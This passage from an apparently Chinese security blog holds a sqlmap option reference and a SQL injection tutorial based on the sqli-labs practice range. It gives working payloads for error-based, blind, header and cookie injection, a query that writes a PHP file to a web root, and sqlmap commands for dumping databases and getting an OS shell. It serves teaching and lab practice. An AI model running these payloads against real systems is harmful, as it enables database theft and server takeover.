--banner</span><br></pre></td></tr></table></figure><h3 id="设置日志过滤目标"><a href="#设置日志过滤目标" class="headerlink" title="设置日志过滤目标"></a>设置日志过滤目标</h3><p>日志解析，并指定有效的Python正则表达式，用于过滤所需的日志</p><p>–scope</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -l burp.log --scope="(www)?\.target\.(com|net|org)"</span><br></pre></td></tr></table></figure><p>–skip-urlencode 不进行URL加密，有时中文或符号在服务端不遵循这种加密。</p><h3 id="设置忽略401"><a href="#设置忽略401" class="headerlink" title="设置忽略401"></a>设置忽略401</h3><p>–ignore-401  用来忽略未验证错误</p><p>当你想测试偶尔返回401（未授权的）站点，，你想忽略他并在不提供验证的情况下继续测试</p><h3 id="设置http协议私钥"><a href="#设置http协议私钥" class="headerlink" title="设置http协议私钥"></a>设置http协议私钥</h3><p>当web服务器需要适当地客户端证书和用于身份验证的私钥时，提供的值为pem格式的key-file，其中包含证书和私钥。</p><p>–auth-file 文件名</p><h3 id="设置安全模式"><a href="#设置安全模式" class="headerlink" title="设置安全模式"></a>设置安全模式</h3><p>避免多次请求失败后销毁会话</p><p>可能发生在sqlmap的检测阶段会利用任何盲sql注入类型时，原因是sql有效负载不一定返回输出，因此可能会向应用程序会话管理或检查技术发出信号。</p><p>–safe-url</p><p>–safe-post</p><p>–safe-req</p><p>–safe-freq</p><h3 id="设置忽略URL编码"><a href="#设置忽略URL编码" class="headerlink" title="设置忽略URL编码"></a>设置忽略URL编码</h3><p>–skip-urlencode</p><p>根据参数的位置（例如get）,默认情况下他的值可以是URL编码的。在某些情况下，后端web服务器不遵循RFC标准，需要以原始的非编码形式发送值。</p><h2 id="性能优化设置"><a href="#性能优化设置" class="headerlink" title="性能优化设置"></a>性能优化设置</h2><p><code>-o</code> 可以开启所有性能优化参数</p><h3 id="设置持久http连接"><a href="#设置持久http连接" class="headerlink" title="设置持久http连接"></a>设置持久http连接</h3><p>在HTTP报文中设置Connection：Keep-Alive。可避免服务器资源，性能受到影响</p><p>–keep-alive </p><h3 id="设置不接受http-body"><a href="#设置不接受http-body" class="headerlink" title="设置不接受http body"></a>设置不接受http body</h3><p>sqlmap中检索没有body响应的内容</p><p>–unll-connection</p><h3 id="设置多线程"><a href="#设置多线程" class="headerlink" title="设置多线程"></a>设置多线程</h3><p>默认 1，为不影响服务器的性能和资源，sqlmap最大为 10 </p><p>–threads</p><h3 id="设置预测输出"><a href="#设置预测输出" class="headerlink" title="设置预测输出"></a>设置预测输出</h3><p>与–thread不兼容，在算法中用于检索值字符的顺序统计预测</p><p>–predict-output</p><h2 id="指定位置注入"><a href="#指定位置注入" class="headerlink" title="指定位置注入"></a>指定位置注入</h2><h3 id="注入介绍"><a href="#注入介绍" class="headerlink" title="注入介绍"></a>注入介绍</h3><h3 id="设置指定注入参数"><a href="#设置指定注入参数" class="headerlink" title="设置指定注入参数"></a>设置指定注入参数</h3><p><code>-p</code>指定具体的探测参数（例 -p “id,uesr-agent”）</p><p>–skip:忽略探测具体参数，例如 –level –skip “user-agent,referer”</p><blockquote><p>–level 1-5,5时忽略所有参数</p></blockquote><p>–param-exclude：忽略包含具体内容的参数。例如：–param-exclude=”token|session” 不对包含token或session的参数进行探测</p><p>–skip-static：忽略非动态参数</p><h3 id="设置任意注入位置"><a href="#设置任意注入位置" class="headerlink" title="设置任意注入位置"></a>设置任意注入位置</h3><p>例：参数：值*</p><h2 id="注入参数"><a href="#注入参数" class="headerlink" title="注入参数"></a>注入参数</h2><h3 id="强制设置DBMS"><a href="#强制设置DBMS" class="headerlink" title="强制设置DBMS"></a>强制设置DBMS</h3><p>默认会自动探测目标web应用程序的后端数据库管理系统</p><p>sqlmap完全支持的dbms种类：MySQL，oracle,Microsoft sql server,ibm db2,sqlite,firebird,sybase,sap maxdb,hsqldb,informix</p><p>–dbms 数据库管理系统名称 [版本号]</p><p>例如：–dbms mysql [5.0]    –dbms microsoft sql sever 05</p><h3 id="强制设置OS指定"><a href="#强制设置OS指定" class="headerlink" title="强制设置OS指定"></a>强制设置OS指定</h3><p>默认自动识别探测目标web应用程序的后端操作系统（OS）</p><p>sqlmap全支持的OS种类：Linux，Windows</p><p>–os windows 或 –os linux</p><h3 id="关闭负载转换机制"><a href="#关闭负载转换机制" class="headerlink" title="关闭负载转换机制"></a>关闭负载转换机制</h3><p>–no-cast：防止NULL与字符串连接（dbms版本老旧），将null转换为空格</p><h3 id="关闭字符转义机制"><a href="#关闭字符转义机制" class="headerlink" title="关闭字符转义机制"></a>关闭字符转义机制</h3><p>–no-escape</p><blockquote><p>字符转义机制:’f’    CHAR(102),混淆有效负载内容，防止后端服务器上查询转义机制（例如magic_quotes和/或 mysql_real_escape_string）</p></blockquote><h3 id="强制设置无效值替换"><a href="#强制设置无效值替换" class="headerlink" title="强制设置无效值替换"></a>强制设置无效值替换</h3><p>要使原始参数值无效（例如id=12）时，经典的否定（例如id=-12）</p><p> –invalid-bignum ：强制使用大整数（例如id=99999999）</p><p>–invalid-logical ：强制使用布尔操作来实现相同的目标（例如id=12 and 18=19）</p><p>–invalid-string ：强制使用随机字符串（例如id=adsfa）</p><h3 id="自定义注入负载位置"><a href="#自定义注入负载位置" class="headerlink" title="自定义注入负载位置"></a>自定义注入负载位置</h3><p>–prefix ：sql注入payload前缀</p><p>–suffix  ：sql注入payload后缀</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://target.php?id=1" -p id --prefix "')" --suffix "and ('abc'=abc" --dbs -v 5</span><br></pre></td></tr></table></figure><h3 id="设置tamper脚本"><a href="#设置tamper脚本" class="headerlink" title="设置tamper脚本"></a>设置tamper脚本</h3><p>–tamper</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "..." --tamper "between.py,randomcase.py" -v 3</span><br></pre></td></tr></table></figure><blockquote><p>-v 3,5  查看http请求中的payload</p><p>存储脚本位置(usr/share/sqlmap/tamper)</p></blockquote><h3 id="设置dbms认证"><a href="#设置dbms认证" class="headerlink" title="设置dbms认证"></a>设置dbms认证</h3><p>–dbms-cred=”root:toor”</p><h2 id="自定义检测参数"><a href="#自定义检测参数" class="headerlink" title="自定义检测参数"></a>自定义检测参数</h2><h3 id="设置探测等级"><a href="#设置探测等级" class="headerlink" title="设置探测等级"></a>设置探测等级</h3><p>–level 1-5，默认1，探测复杂程度逐步提升</p><p>在xml/payload.xml 中指定了有效负载</p><h3 id="设置风险参数"><a href="#设置风险参数" class="headerlink" title="设置风险参数"></a>设置风险参数</h3><p>–risk 1-3 ，默认1基本无害，2增加了基于时间的sql注入，3又增加了or的sql 注入</p><p>例如update，or 可能会打乱表单</p><h3 id="设置页面比较参数"><a href="#设置页面比较参数" class="headerlink" title="设置页面比较参数"></a>设置页面比较参数</h3><p>–string 指定包含字符穿，查询为true</p><p>–not-string  指定包含字符串，查询为false</p><p>–regexp 指定通过正则表达式匹配字符串，查询为true</p><p>–code 指定匹配http状态响应码，查询为true</p><h3 id="设置内容比较参数"><a href="#设置内容比较参数" class="headerlink" title="设置内容比较参数"></a>设置内容比较参数</h3><p>–text-only 设置页面内容包含文本(–text-only=”welcome!”)</p><p>–titles 设置title中包含文本，前提是知道如何区分查询的真假（–titles=”Login”）</p><h2 id="注入技术参数"><a href="#注入技术参数" class="headerlink" title="注入技术参数"></a>注入技术参数</h2><h3 id="设置具体sql注入技术"><a href="#设置具体sql注入技术" class="headerlink" title="设置具体sql注入技术"></a>设置具体sql注入技术</h3><p>默认 使用所有技术</p><p>–technique</p><p>B:Boolean-based blind 基于布尔的盲注</p><p>E：Error-based 报错注入</p><p>U：Union query-based Union查询注入(union)</p><p>S：Stacked queries 堆叠注入(;)</p><p>T：Time-based blind 基于时间的盲注</p><p>Q：lnline queries 内联查询注入(and,or)</p><h3 id="设置时间盲注延迟时间"><a href="#设置时间盲注延迟时间" class="headerlink" title="设置时间盲注延迟时间"></a>设置时间盲注延迟时间</h3><p>–time-sec 整数，默认为5秒</p><h3 id="设置union字段数"><a href="#设置union字段数" class="headerlink" title="设置union字段数"></a>设置union字段数</h3><p>默认情况下 使用1-10列的union查询的sql注入技术，但是提高level值，可增加至50列</p><p>–union-cols 12-16</p><h3 id="设置union字符"><a href="#设置union字符" class="headerlink" title="设置union字符"></a>设置union字符</h3><p>–union-char 123 替换unll,可能会使探测成功</p><h3 id="设置union查询表"><a href="#设置union查询表" class="headerlink" title="设置union查询表"></a>设置union查询表</h3><p>–union-from 表名(其他表有限制)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "" --technique U --union-from users --current-db -v3</span><br></pre></td></tr></table></figure><h3 id="设置DNS露出攻击"><a href="#设置DNS露出攻击" class="headerlink" title="设置DNS露出攻击"></a>设置DNS露出攻击</h3><p>针对目标网络可能对外流量进行限制，或者设置WAF。通过dns协议绕过限制，获取数据</p><p>–dns-domain “dns 服务器”（需要用户具有一个开放53端口的dns服务器），通过dns流量来获取数据</p><h3 id="设置二次注入"><a href="#设置二次注入" class="headerlink" title="设置二次注入"></a>设置二次注入</h3><p>–second-order url(url为二次注入的响应页面）</p><h3 id="识别指纹"><a href="#识别指纹" class="headerlink" title="识别指纹"></a>识别指纹</h3><p>–fingerprint -f</p><h2 id="检索DBMS信息"><a href="#检索DBMS信息" class="headerlink" title="检索DBMS信息"></a>检索DBMS信息</h2><h3 id="检索dbms-banner"><a href="#检索dbms-banner" class="headerlink" title="检索dbms banner"></a>检索dbms banner</h3><p>–banner -b 获取后端数据库banner信息</p><h3 id="检索dbms当前用户"><a href="#检索dbms当前用户" class="headerlink" title="检索dbms当前用户"></a>检索dbms当前用户</h3><p>–current-user</p><h3 id="检索dbms当前数据库"><a href="#检索dbms当前数据库" class="headerlink" title="检索dbms当前数据库"></a>检索dbms当前数据库</h3><p>–current-db 获取当前数据库名</p><h3 id="检索当前主机名"><a href="#检索当前主机名" class="headerlink" title="检索当前主机名"></a>检索当前主机名</h3><p>–hostname</p><h3 id="探测当前用户DBA"><a href="#探测当前用户DBA" class="headerlink" title="探测当前用户DBA"></a>探测当前用户DBA</h3><p>–is-dba 探测当前用户是否是数据库管理员</p><h3 id="枚举DBMS用户"><a href="#枚举DBMS用户" class="headerlink" title="枚举DBMS用户"></a>枚举DBMS用户</h3><p>–users 获取dbms所有用户</p><h3 id="枚举dbms用户密码"><a href="#枚举dbms用户密码" class="headerlink" title="枚举dbms用户密码"></a>枚举dbms用户密码</h3><p>–password 获取用户密码</p><h3 id="枚举dbms权限"><a href="#枚举dbms权限" class="headerlink" title="枚举dbms权限"></a>枚举dbms权限</h3><p>–privileges</p><p>–role(角色)</p><h2 id="枚举信息"><a href="#枚举信息" class="headerlink" title="枚举信息"></a>枚举信息</h2><h3 id="列举数据库名"><a href="#列举数据库名" class="headerlink" title="列举数据库名"></a>列举数据库名</h3><p>-dbs</p><h3 id="枚举数据库表"><a href="#枚举数据库表" class="headerlink" title="枚举数据库表"></a>枚举数据库表</h3><p>–tables 枚举表名 -》指定具体数据库 -D 数据库名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-D security --tables</span><br></pre></td></tr></table></figure><p>–exclude-sysdbs 获取除了系统数据库的表名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--tables --exclude-sysdbs</span><br></pre></td></tr></table></figure><h3 id="枚举数据表列"><a href="#枚举数据表列" class="headerlink" title="枚举数据表列"></a>枚举数据表列</h3><p>–columns -D指定数据库 -T指定数据表 </p><h3 id="枚举数据值"><a href="#枚举数据值" class="headerlink" title="枚举数据值"></a>枚举数据值</h3><p>–dump    -D -T -C制定具体字段</p><h3 id="枚举schema信息"><a href="#枚举schema信息" class="headerlink" title="枚举schema信息"></a>枚举schema信息</h3><p>–schema</p><p>–schema –ex clude-sysdbsg    只会检索和显示非系统数据库的模式的一部分</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "..." --schema --threads 10 --batch</span><br></pre></td></tr></table></figure><h3 id="检索数据表数量"><a href="#检索数据表数量" class="headerlink" title="检索数据表数量"></a>检索数据表数量</h3><p>–count -D</p><h3 id="获取数据信息"><a href="#获取数据信息" class="headerlink" title="获取数据信息"></a>获取数据信息</h3><p>–start –stop</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--start 1 --stop 3</span><br></pre></td></tr></table></figure><p>不包括第一页，<del>1</del>23</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--stop 1</span><br></pre></td></tr></table></figure><p>获取第一张表</p><p>–first –last</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--first 2 --last 5</span><br></pre></td></tr></table></figure><p>从第二个出发到第五个字符</p><h3 id="设置条件获取信息"><a href="#设置条件获取信息" class="headerlink" title="设置条件获取信息"></a>设置条件获取信息</h3><p>–pivot-column=id 设置独一无二的列，主键</p><p>–where=”id&gt;3” 设置条件</p><h3 id="暴力破解数据"><a href="#暴力破解数据" class="headerlink" title="暴力破解数据"></a>暴力破解数据</h3><p>使用场景：MySQL&lt;5.0时，MySQL中没有元数据库information_schema</p><p>–common-tables 破解数据库名</p><p>–common-columus 破解表名</p><h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p>须有读取权限</p><p>–file-read 路径（绝对路径）     读取对应文件内容</p><h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><p>须有写入权限</p><p>–file-write 写入本地文件(绝对路径)</p><p>–file-dest 将读取的文件写入到远程绝对路径（结对路径）</p><h3 id="检索所有信息"><a href="#检索所有信息" class="headerlink" title="检索所有信息"></a>检索所有信息</h3><p>-a -all</p><h2 id="系统参数"><a href="#系统参数" class="headerlink" title="系统参数"></a>系统参数</h2><h3 id="执行系统参数"><a href="#执行系统参数" class="headerlink" title="执行系统参数"></a>执行系统参数</h3><p>–os-shell</p><p>（1）网站必须是root权限</p><p>（2）攻击者需要知道网站的绝对路径</p><p>（3）GPC为off，php主动转义的功能关闭</p><h2 id="通用参数"><a href="#通用参数" class="headerlink" title="通用参数"></a>通用参数</h2><h3 id="加载sqlite会话文件"><a href="#加载sqlite会话文件" class="headerlink" title="加载sqlite会话文件"></a>加载sqlite会话文件</h3><p>-s </p><h3 id="加载http文本文件"><a href="#加载http文本文件" class="headerlink" title="加载http文本文件"></a>加载http文本文件</h3><p>-t 将流量加载到文本文件当中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "..." -t /root/Desktop/target.txt --flush-session -v3 --batch</span><br></pre></td></tr></table></figure><h3 id="设置默认选择选项"><a href="#设置默认选择选项" class="headerlink" title="设置默认选择选项"></a>设置默认选择选项</h3><p>–batch</p><h3 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h3><p>–os-cmd=”命令”</p><h3 id="设置盲注字符集"><a href="#设置盲注字符集" class="headerlink" title="设置盲注字符集"></a>设置盲注字符集</h3><p>在基于时间，布尔盲注中，用户自定义字符集来加速数据检索过程</p><p>–charset=”123456789asdw”</p><h3 id="爬取url"><a href="#爬取url" class="headerlink" title="爬取url"></a>爬取url</h3><p>爬取三层url</p><p>三层</p><h3 id="在CSV输出中使用分割字符"><a href="#在CSV输出中使用分割字符" class="headerlink" title="在CSV输出中使用分割字符"></a>在CSV输出中使用分割字符</h3><p>–csv-del=”;”</p><h3 id="设置输出格式"><a href="#设置输出格式" class="headerlink" title="设置输出格式"></a>设置输出格式</h3><p>在将转储表数据存储到输出目录中的相应文件中时，sqlmap支持三种不同的格式：CSV，HTML和SQLITE。默认的是CSV</p><p>–dump-format=””</p><h3 id="探测之前检测Internet连接"><a href="#探测之前检测Internet连接" class="headerlink" title="探测之前检测Internet连接"></a>探测之前检测Internet连接</h3><p>检测当前计算机Internet连接是否正常（是否能连接sqlmap指定服务器上）</p><p>–check-internet</p><h3 id="解析和测试表单"><a href="#解析和测试表单" class="headerlink" title="解析和测试表单"></a>解析和测试表单</h3><p>–form</p><h3 id="估计时间"><a href="#估计时间" class="headerlink" title="估计时间"></a>估计时间</h3><p>–eta</p><h3 id="刷新会话文件"><a href="#刷新会话文件" class="headerlink" title="刷新会话文件"></a>刷新会话文件</h3><p>避免默认缓存机制</p><p>–flush-session</p><h3 id="忽略会话中存储的结果"><a href="#忽略会话中存储的结果" class="headerlink" title="忽略会话中存储的结果"></a>忽略会话中存储的结果</h3><p>保持会话文件不变</p><p>–fresh-queries</p><p>使用Hex函数检索数据</p><p>确保数据不会丢失，返回正确结果</p><p>–hex</p><h3 id="自定义输出路径"><a href="#自定义输出路径" class="headerlink" title="自定义输出路径"></a>自定义输出路径</h3><p>–output-dir=””</p><h3 id="响应页面解析错误"><a href="#响应页面解析错误" class="headerlink" title="响应页面解析错误"></a>响应页面解析错误</h3><p>–parse-errors 返回错误信息</p><p>–save=“路径” 保存为配置文件（-c）</p><p>–update 更新</p><h3 id="设置DBMS编码"><a href="#设置DBMS编码" class="headerlink" title="设置DBMS编码"></a>设置DBMS编码</h3><p>–encoding=”gbk”</p><h3 id="存储http流量到HAR"><a href="#存储http流量到HAR" class="headerlink" title="存储http流量到HAR"></a>存储http流量到HAR</h3><p>HAR(http archive) 是一个用来储存http请求/响应信息的通用文件格式，基于JSON</p><p>–har=”HARFILE”</p><h3 id="筛选具体payload"><a href="#筛选具体payload" class="headerlink" title="筛选具体payload"></a>筛选具体payload</h3><p>–test-filter=“ROW”</p><h3 id="过滤具体payload"><a href="#过滤具体payload" class="headerlink" title="过滤具体payload"></a>过滤具体payload</h3><p>–test-skip=”BENCHMARK” </p><p>–scope=”regex”  针对proxy日志文件使用正则表达式筛选目标</p><blockquote><p>参考链接</p><p><a href="https://www.freebuf.com/sectool/164608.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/164608.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/categories/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/categories/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>sql注入原理和sqli靶场</p><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>服务端的sql语句被恶意修改并成功执行的行为。</p><p>原理：</p><p>客户端向服务端发送数据，服务端未严格校验客户端发送数据（sql语言是解释型语言）</p><p>产生具体原因：</p><ul><li>代码对sql语句的参数过滤不严格</li><li>未启用框架的安全配置，如php的gpc</li><li>未使用安全框架的查询方法，如对应开发语言的安全框架的查询接口</li><li>测试接口未删除</li><li>未启用防火墙</li><li>未启用其他安全防护设备</li></ul><p>业务场景：</p><p>所有与数据库产生交互的地方都有可能</p><ul><li>登录功能</li><li>搜索功能</li><li>详情页</li><li>商品购买</li><li>…</li></ul><p>漏洞危害：</p><ul><li>数据库信息泄露</li><li>网页篡改</li><li>网站被挂马，传播恶意软件</li><li>数据库被恶意操作</li><li>服务器被远程控制，被安装后门</li></ul><p>不同人的看法：</p><ul><li>研发人员：这不是bug,不要耽误我的开发进度</li><li>运维人员：研发怎么回事？</li><li>产品经理：研发怎么回事？</li><li>安全人员：这研发一点安全意识都没有</li><li>吃瓜群众：真香（看热闹），？？？说的啥</li></ul><p>步骤：</p><ol><li>判断是否有注入（是否严格校验）<br>(1).可控参数改变能否影响页面显示<br>(2).输入了sql语句是否能报错（报错可看到数据库的一些语句痕迹，不报错可判断我们的语句是否成功闭合）</li><li>什么类型的注入，盲注或报错注入</li><li>恶意语句进行查询</li><li>是否能成功执行</li><li>获取数据</li></ol><p>数据库提权</p><p>万能密码登陆 ASP站点’or’=‘or’ </p><p>窃取哈希口令</p><p>读写文件 </p><p>数据库备份文件 </p><h2 id="SQL数据库种类"><a href="#SQL数据库种类" class="headerlink" title="SQL数据库种类"></a>SQL数据库种类</h2><ul><li>Access </li></ul><p>本地访问 </p><ul><li>MySQL </li></ul><p>端口号：3306 </p><p>mysql数据库库结构：默认mysql和infomation_schema数据库<br>infomatino_schema内的schemata表存有所有库名；tables表中的所有表名；columns表内存有所有字段名。<br>数据库-&gt;表-&gt;字段-&gt;值</p><p>information_schema数据库：</p><table><thead><tr><th>表名</th><th>作用</th><th>列名（字段名）</th><th>作用（存储字段值）</th></tr></thead><tbody><tr><td>schemata</td><td>存储的是用户创建所有数据库的库名</td><td>schemata_name</td><td>记录数据库库名的字段</td></tr><tr><td></td><td></td><td>default_character_set_name</td><td>数据存储格式</td></tr><tr><td>tables</td><td>所有表名</td><td>table_schema</td><td>存储所有数据库名</td></tr><tr><td></td><td></td><td>table_name</td><td>存储所有表名</td></tr><tr><td>columns</td><td>所有字段名</td><td>table_schema</td><td>存储所有数据库名</td></tr><tr><td></td><td></td><td>table_name</td><td>存储所有表名</td></tr><tr><td></td><td></td><td>column_name</td><td>存储所有字段名（列名）</td></tr></tbody></table><p>查询全部列 select 列 from xxxx库.xxx表; </p><p>查询值 limit </p><p>注释符号：–空格，/ /内联注释，#  ‘a’ ‘b’=‘ab’ </p><p>后使用 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1) 这种方式触发 sql 注入，受到 Mysql 版本的限制，其区间在 Mysql 5.1.5 - Mysql5.5 附近。 </p><ul><li>SQLSever </li></ul><p>端口号：1433 注释符号：–，/ /注释 ‘a’+‘b’=‘ab’ </p><ul><li>Oracle </li></ul><p>端口号：1521 注释符号：–，/ /注释 ‘a’||‘b’=‘ab’ </p><ul><li>PostgreSQL </li></ul><p>端口号：5432或者5433 注释符号：–，/ /注释 ‘a’||‘b’=‘ab’ </p><ul><li>DB2 </li></ul><p>端口号：5000 SQLite 一种数据库文件，特别小，就一个库多个表，可用sqlite或者sqlite2打开 </p><ul><li>MongoDB </li></ul><p>端口号：27017 </p><h2 id="sql攻击手段"><a href="#sql攻击手段" class="headerlink" title="sql攻击手段"></a>sql攻击手段</h2><h3 id="报错注入常用函数"><a href="#报错注入常用函数" class="headerlink" title="报错注入常用函数"></a>报错注入常用函数</h3><ul><li><p>concat()</p><p>concat(1,2,3) 1,2,3紧挨着</p></li><li><p>concat_ws()<br>concat_ws(“ “,1, 2,3) 1,2,3 用空格分隔</p></li><li><p>updatexml()</p><p> updatexml(1,concat(0x7e,SUBSTR(database(),1,24),0x7e),1) 替换符合条件的文本</p></li><li><p>extractvalue()</p><p> extractvalue(0x0a,concat(0x0a,(select database())))  查找</p></li><li><p>limit </p><p>limit 1,5 检索1后面五个，也就是2-6</p></li></ul><h3 id="盲注常用函数"><a href="#盲注常用函数" class="headerlink" title="盲注常用函数"></a>盲注常用函数</h3><ul><li><p>length()    </p><p>length(“123456789”)=9 返回字符串长度，输出9</p></li><li><p>left()</p><p>left(”123456789“,5) 提取字符串，从左开始，输出12345 </p></li><li><p>substr()    与此相同的mid(),substring()</p><p>substr(“123456789”, 5, 3) 提取子字符串，输出567</p></li><li><p>ascii()</p><p>ascii(“s”)  返回特定字符的ASCII值 </p></li></ul><h3 id="mysql读写文件："><a href="#mysql读写文件：" class="headerlink" title="mysql读写文件："></a>mysql读写文件：</h3><p>读：</p><blockquote><p>前提：show global variables like “secure_file_priv”;</p><p><img src="mysqld_secure_file_priv.png" alt=""></p><p>修改my.ini </p><p><img src="null.png" alt=""></p><p><img src="null_no.png" alt=""></p><p>重启phpstudy.</p><p>select load_file(“f:\1.txt”)；</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,load_file(f:www\\Less-7\\flag.txt),3 --+</span><br></pre></td></tr></table></figure><p>写：</p><blockquote><p>前提：show variables like ‘%general%’;</p><p><img src="write-1.png" alt=""></p><p>查看其general_log 是否为 OFF。</p><p>若是，则修改为 on 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log &#x3D; on;</span><br></pre></td></tr></table></figure><p><img src="write_yes.png" alt=""></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union select 1,&#39;&lt;?php phpinfo();?&gt;&#39;,3 into outfile &quot;f:www\\Less-7\\1.php&quot; --+</span><br><span class="line"></span><br><span class="line">127.0.0.1\Less-7\1.php #查看是否写入成功</span><br></pre></td></tr></table></figure><p>建议一句话 PHP 语句转换成十六进制</p><p><code>sqlmap:</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -hh</span><br><span class="line">sqlmap -u "注入点" --file-read "文件路经"</span><br><span class="line">4444 --file-write</span><br><span class="line">4444 --file-dest</span><br></pre></td></tr></table></figure><h3 id="post-基于报错"><a href="#post-基于报错" class="headerlink" title="post 基于报错"></a>post 基于报错</h3><blockquote><p>get与post的区别:注入点发生改变，post 无法在浏览器中查看与修改，但是可以用插件。</p></blockquote><p><code>burpsuite</code></p><p>burpsuite 抓取http数据包保存在文件中</p><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 文件路径 -p 指定探测参数</span><br></pre></td></tr></table></figure><h3 id="get报错注入-未完善"><a href="#get报错注入-未完善" class="headerlink" title="get报错注入(未完善)"></a>get报错注入(未完善)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)</span><br></pre></td></tr></table></figure><blockquote><p>注解： 011011</p></blockquote><h3 id="post-基于时间和布尔值的盲注"><a href="#post-基于时间和布尔值的盲注" class="headerlink" title="post 基于时间和布尔值的盲注"></a>post 基于时间和布尔值的盲注</h3><p><code>burpsuite</code>抓取http报文</p><p>时间：… and (select (if (lenght (datebase() )&gt; 5,sleep(5),null))) –+ </p><p>布尔：… and (lenght (database() )&gt;5) –+</p><p><code>sqlmap</code> </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">时间 ： sqlmap -r "文件路径" -p  参数   --technique T </span><br><span class="line">布尔：   sqlmap -r "文件路径" -p  参数   --technique B</span><br></pre></td></tr></table></figure><h3 id="http头中的注入"><a href="#http头中的注入" class="headerlink" title="http头中的注入"></a>http头中的注入</h3><p>在user-agent 和 referer 未被屏蔽时，可以进行注入</p><p><code>burpsuite</code></p><p>user-agent: </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and updatexml(1,concat(0x7e,version(),0x7e),1) or '1'='1</span><br></pre></td></tr></table></figure><p>referer:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (length(datebase())&gt;8) or if (1=1,sleep(5),null) or '1'='1</span><br></pre></td></tr></table></figure><h3 id="post-update语句的注入"><a href="#post-update语句的注入" class="headerlink" title="post_update语句的注入"></a>post_update语句的注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,version(),0x7e),1)</span><br></pre></td></tr></table></figure><blockquote><p>注解： 1报错，执行”concat(0x7e,version(),0x7e)”做sql语句，替换报错内容，在报错中执行，最后输出。</p></blockquote><p>updatexml和extractvalue函数</p><h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>例：less-20</p><p><code>burpsuite</code></p><p>抓取，用” \ “判断闭合符号，之后 and 1=1,或 and \ or 加sql语句</p><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r "target.txt" --level 3 --batch </span><br><span class="line">sqlmap.py -r "target.txt" --level 3 --batch --dbs</span><br><span class="line">sqlmap.py -r "target.txt" --level 3 --batch -D security --tables</span><br><span class="line">sqlmap.py -r "target.txt" --level 3 --batch -D security -T users --columns </span><br><span class="line">sqlmap.py -r "target.txt" --level 3 --batch -D security -T users -C password,username --dump</span><br></pre></td></tr></table></figure><h3 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h3><p><code>burpsuite</code></p><p>首先截取，decoder 进行加密，例如：admin\ base64加密后为：YWRtaW5c</p><p>进行报错。</p><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r "target.txt" --level 3 --batch --tamper base64encode.py</span><br></pre></td></tr></table></figure><h3 